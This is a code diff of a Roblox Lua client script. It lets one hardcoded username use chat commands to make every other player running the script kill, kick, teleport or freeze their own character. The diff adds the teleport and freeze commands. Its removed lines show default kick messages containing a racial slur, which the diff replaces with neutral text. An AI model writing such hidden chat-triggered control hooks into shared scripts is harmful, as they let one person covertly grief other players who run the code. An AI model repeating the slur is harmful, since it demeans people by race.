@@ -12,30 +12,58 @@ local function killSelf()
 end
 
 local function kickSelf(reason)
-    reason = reason or "Kicked by Monkey Nigga"
+    reason = reason or "You have been kicked by the admin."
     LocalPlayer:Kick(reason)
+end
+
+local function bringToPlayer(targetPlayer)
+    local localChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    local targetChar = targetPlayer.Character or targetPlayer.CharacterAdded:Wait()
+
+    local root = localChar:FindFirstChild("HumanoidRootPart")
+    local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
+
+    if root and targetRoot then
+        root.CFrame = targetRoot.CFrame + Vector3.new(2, 0, 0)
+    end
+end
+
+local function freezeSelf()
+    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    local root = char:FindFirstChild("HumanoidRootPart")
+    if root then
+        root.Anchored = true
+    end
+end
+
+local function unfreezeSelf()
+    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    local root = char:FindFirstChild("HumanoidRootPart")
+    if root then
+        root.Anchored = false
+    end
 end
 
 local function onPlayerChatted(player, msg)
     local lowerMsg = msg:lower()
     local command, param = lowerMsg:match("^(%S+)%s*(.*)$")
 
-    if command == "!killusers" then
-        if player.Name == ALLOWED_USERNAME then
-            if LocalPlayer.Name ~= ALLOWED_USERNAME then
-                killSelf()
-            end
-        end
+    if player.Name == ALLOWED_USERNAME and LocalPlayer.Name ~= ALLOWED_USERNAME then
+        if command == "!killusers" then
+            killSelf()
 
-    elseif command == "!kickusers" then
-        if player.Name == ALLOWED_USERNAME then
-            if LocalPlayer.Name ~= ALLOWED_USERNAME then
-                local kickMessage = param
-                if kickMessage == "" then
-                    kickMessage = "Kicked by Monkey Nigger"
-                end
-                kickSelf(kickMessage)
-            end
+        elseif command == "!kickusers" then
+            local kickMessage = param ~= "" and param or "You have been kicked by the admin."
+            kickSelf(kickMessage)
+
+        elseif command == "!bringusers" then
+            bringToPlayer(player)
+
+        elseif command == "!freezeusers" then
+            freezeSelf()
+
+        elseif command == "!unfreezeusers" then
+            unfreezeSelf()
         end
     end
 end
